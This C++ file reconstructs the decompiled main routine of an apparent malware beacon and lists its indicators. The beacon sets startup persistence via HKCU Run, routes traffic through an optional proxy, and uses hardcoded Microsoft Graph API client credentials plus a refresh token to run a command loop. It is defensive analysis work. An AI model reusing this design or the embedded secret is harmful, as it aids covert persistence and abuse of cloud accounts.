// main.cpp — Reconstructed _main entry point
// Decompiled from IDA; SSO string internals and scope-guard bookkeeping
// stripped for readability.  All string literals, control flow, and call
// targets are faithful to the binary.
// -----------------------------------------------------------------------

#include "analysis_types.hpp"

#include <cstring>
#include <string>
#include <vector>

namespace oceandrift::analysis {

// Logging stubs — the binary's agent_log / show_error are unresolved
static void agent_log(const std::string&) {}
static void show_error(const std::string&) {}

// -----------------------------------------------------------------------
// _main
//
// Master entry point.  Performs five sequential phases:
//   1. Log startup and dump argv
//   2. Locate and load configuration (config.dat > config.json fallback)
//   3. Extract Graph API credentials + refresh token
//   4. Initialise beacon context (optionally with proxy)
//   5. Enter worker loop until beacon stops
// -----------------------------------------------------------------------
int /* __cdecl */ main_pseudocode(int argc, const char** argv, const char** envp)
{
    // --- Phase 0 : startup banner -----------------------------------
    std::string cwd = get_current_directory_w();
    agent_log("Agent starting, working directory: " + cwd);

    // --- Dump every argv entry --------------------------------------
    for (int i = 0; i < argc; ++i) {
        std::string arg(argv[i]);
        agent_log("argv[" + std::to_string(i) + "]: " + arg);
    }

    // --- Phase 1 : locate configuration file ------------------------
    std::string config_dat_path = format_config_dat_path();
    bool config_dat_exists = path_exists(config_dat_path);

    if (config_dat_exists) {
        uint64_t sz = path_file_size(config_dat_path);
        agent_log("config.dat exists, size: " + std::to_string(sz));
    } else {
        std::string config_json_path = format_config_json_path();
        bool config_json_exists = path_exists(config_json_path);

        if (!config_json_exists) {
            agent_log("ERROR: No configuration file found in current directory");
            show_error("No configuration file found in current directory");
                           return 1;
        }
        uint64_t sz = path_file_size(config_json_path);
        agent_log("config.json exists, size: " + std::to_string(sz));
    }

    // --- Handle --autostart flag ------------------------------------
    if (argc > 1) {
        for (int idx = 1; idx < argc; ++idx) {
            if (strcmp(argv[idx], "--autostart") == 0) {
                agent_log("Processing autostart flag");

                // Build quoted command line from argv[0] plus
                // all args except --autostart
                std::string exe_path(argv[0]);
                std::string cmdline = "\"" + exe_path + "\"";

                for (int j = 1; j < argc; ++j) {
                    if (strcmp(argv[j], "--autostart") != 0) {
                        cmdline += " " + std::string(argv[j]);
                    }
                }

                if (handle_autostart_flag(argc, argv)) {
                    agent_log("Added to startup successfully");
                }
                break;
            }
        }
    }

    // --- Parse proxy arguments from command line --------------------
    bool proxy_enabled = parse_proxy_args(argc, argv);
    agent_log("Proxy enabled: " + std::string(proxy_enabled ? "true" : "false"));

    // --- Phase 2 : set up Graph API credential defaults -------------
    std::string refresh_token;
    std::string redirect_uri  = "http://localhost/";
    std::string client_id      = "675b5280-b233-4368-ba9e-b4c55cbeebe9";
    std::string tenant_id      = "e2aa8d24-85a2-41e6-b993-572b35980557";
    std::string client_secret  = "gVd8Q~r5QwHkIb3NsNraqGLUPwlhnngrpYcSKbjl";

    // --- Phase 3 : load configuration from file ---------------------
    // Global JSON root is initialised once (thread-safe init guard)
    static json g_config_root_json;

    bool config_loaded = false;

    // Try config.dat first
    if (path_exists(format_config_dat_path())) {
        agent_log("Attempting to load configuration from config.dat");
        std::string full_path = get_current_directory_w()
                                               + "\\config.dat";
        config_loaded = load_config_from_file(&g_config_root_json, full_path);
        agent_log("Config loading result from config.dat: "
                           + std::string(config_loaded ? "success" : "failure"));
    }

    // Fallback to config.json
    if (!config_loaded && path_exists(format_config_json_path())) {
        agent_log("Attempting to load configuration from config.json");
        std::string full_path = get_current_directory_w()
                                               + "\\config.json";
        config_loaded = load_config_from_file(&g_config_root_json, full_path);
        agent_log("Config loading result from config.json: "
                           + std::string(config_loaded ? "success" : "failure"));
    }

    if (!config_loaded) {
        agent_log("ERROR: Failed to load configuration from any file");
        show_error("Failed to load configuration from any file");
                       return 1;
    }
    agent_log("Loaded configuration successfully");

    // --- Phase 4 : extract credentials from config JSON -------------
    // Attempt to read GraphAPI.refreshToken from the loaded JSON
    json* graphapi_obj = json_get_object_member(&g_config_root_json, "GraphAPI");
    if (json_has_member(graphapi_obj, "refreshToken")) {
        json* rt_node = json_get_object_member(graphapi_obj, "refreshToken");
        refresh_token = json_get_string(rt_node);
    }
    // else refresh_token remains empty

    // Override defaults with config values if present
    client_id      = get_graphapi_client_id(&g_config_root_json);      // fallback: hardcoded above
    tenant_id      = get_graphapi_tenant_id(&g_config_root_json);
    client_secret  = get_graphapi_client_secret(&g_config_root_json);
    redirect_uri   = get_graphapi_redirect_uri(&g_config_root_json);

    // Log resolved values
    agent_log("Client ID: "            + client_id);
    agent_log("Tenant ID: "            + tenant_id);
    agent_log("Redirect URI: "         + redirect_uri);
    agent_log("Refresh token length: " + std::to_string(refresh_token.size()));

    if (refresh_token.empty()) {
        agent_log("ERROR: Refresh token not found in config file");
        show_error("Refresh token not found in config file");
                       return 1;
    }

    // --- Phase 5 : create and run the beacon ------------------------
    agent_log("Creating Beacon instance");
    BeaconContext beacon_ctx{};
    // Build a source config struct with the extracted credentials
    BeaconContext src_config{};
    src_config.client_id     = client_id;
    src_config.client_secret = client_secret;
    src_config.refresh_token = refresh_token;
    src_config.tenant_id     = tenant_id;
    beacon_context_init(&beacon_ctx, &src_config);

    // Apply proxy settings to the API session if enabled
    if (proxy_enabled && beacon_ctx.graph_session) {
        std::string proxy_host = get_proxy_host();
        int proxy_port_val = g_proxy_enabled ? g_proxy_port : 0;
        std::string proxy_user = get_proxy_user();
        std::string proxy_pass = get_proxy_password();
        apply_proxy_settings(static_cast<GraphApiSession*>(beacon_ctx.graph_session),
                             proxy_host, proxy_port_val,
                             proxy_user, proxy_pass);
        agent_log("Applied proxy settings to API: " + proxy_host
                           + ":" + std::to_string(proxy_port_val));
    }

    agent_log("Initializing Beacon");
    if (beacon_initialize(&beacon_ctx)) {
        agent_log("Beacon initialized successfully, starting");
        beacon_start_workers(&beacon_ctx);
        agent_log("Entering main loop");

        // Spin in 1-second sleeps until the beacon signals shutdown
        while (beacon_is_running(&beacon_ctx)) {
            sleep_for_seconds(1);
        }
        agent_log("Main thread: Beacon is no longer running");
    } else {
        agent_log("ERROR: Failed to initialize beacon");
        show_error("Failed to initialize beacon");
    }

    // --- Cleanup ----------------------------------------------------
    if (proxy_enabled) {
        clear_proxy_settings();
        agent_log("Cleared proxy settings");
    }
    agent_log("Agent exiting normally");
    beacon_context_destroy(&beacon_ctx);
    graph_api_config_clear(&beacon_ctx);
    return 0;
}

// -----------------------------------------------------------------------
// Evidence / metadata
// -----------------------------------------------------------------------

FunctionEvidence main_workflow_evidence() {
    FunctionEvidence out;
    out.address  = 0x00426350;
    out.function = "_main";
    out.purpose  = "Master entry: loads config, extracts Graph API creds, "
                   "initialises beacon, enters worker loop";
    out.indicators = {
        "Agent starting, working directory: ",
        "config.dat / config.json fallback with path_exists + path_file_size",
        "--autostart flag → handle_autostart_flag",
        "parse_proxy_args + apply_proxy_settings",
        "default client_id:  675b5280-b233-4368-ba9e-b4c55cbeebe9",
        "default tenant_id:  e2aa8d24-85a2-41e6-b993-572b35980557",
        "default client_secret: gVd8Q~r5QwHkIb3NsNraqGLUPwlhnngrpYcSKbjl",
        "default redirect_uri: http://localhost/",
        "GraphAPI.refreshToken JSON lookup",
        "get_graphapi_client_id / tenant_id / client_secret / redirect_uri overrides",
        "beacon_context_init → beacon_initialize → beacon_start_workers",
        "main loop: sleep_for_seconds(1) while beacon_is_running",
        "Agent exiting normally",
    };
    return out;
}

std::vector<WorkflowStep> main_workflow() {
    return {
        {1, "Log startup and argv",
            "Get CWD via get_current_directory_w, log each argv entry"},
        {2, "Locate configuration file",
            "Check path_exists(config.dat), fall back to config.json; "
            "exit 1 if neither found"},
        {3, "Handle --autostart",
            "Scan argv for --autostart; build quoted cmdline, call "
            "handle_autostart_flag to write HKCU\\...\\Run"},
        {4, "Parse proxy arguments",
            "parse_proxy_args populates global proxy host/port/user/pass"},
        {5, "Set credential defaults",
            "Hardcoded client_id, tenant_id, client_secret, redirect_uri; "
            "then override from JSON config's GraphAPI object"},
        {6, "Load config file",
            "Try load_config_from_file(config.dat) then config.json; "
            "exit 1 on total failure"},
        {7, "Extract refresh token",
            "Read GraphAPI.refreshToken from JSON; exit 1 if empty"},
        {8, "Create beacon context",
            "beacon_context_init with refresh_token; optionally apply_proxy_settings"},
        {9, "Initialise and start beacon",
            "beacon_initialize → beacon_start_workers; exit path on failure"},
        {10, "Main loop",
             "sleep_for_seconds(1) while beacon_is_running()"},
        {11, "Cleanup",
             "clear_proxy_settings, beacon_context_destroy, graph_api_config_clear"},
    };
}

}  // namespace oceandrift::analysis
